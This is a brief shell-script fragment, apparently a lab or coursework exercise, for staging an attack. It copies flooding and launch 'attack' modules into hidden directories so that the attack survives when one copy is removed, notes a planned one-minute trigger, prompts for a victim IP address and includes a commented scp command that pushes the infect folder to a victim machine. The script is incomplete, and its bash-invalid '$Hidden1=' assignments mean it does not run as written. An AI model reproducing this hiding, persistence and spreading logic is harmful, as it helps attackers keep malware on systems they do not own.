# task2
# replication attack file to two hidden files
$Hidden1="../../.etc/.qq"
mkdir $Hidden1
cp ./Infect/Flooding_Attack $Hidden1
cp ./Infect/Check_Attack $Hidden1
cp ./Infect/Launching_Attack $Hidden1

$Hidden2="../../.Launch_Attack"
mkdir $Hidden2
cp ./Infect/Launching_Attack $Hidden2

# When one of attack modules is removed, the attack can still be launched by the other

# trigger automatically every 1 minute, if it is not running


# task3
# input victim's IP address
read -p "Enter Victim IP Address: " IP_Address
echo "IP $IP_Address"

# scp -r ./Infect victim@127.0.0.1:/home/victim/Desktop/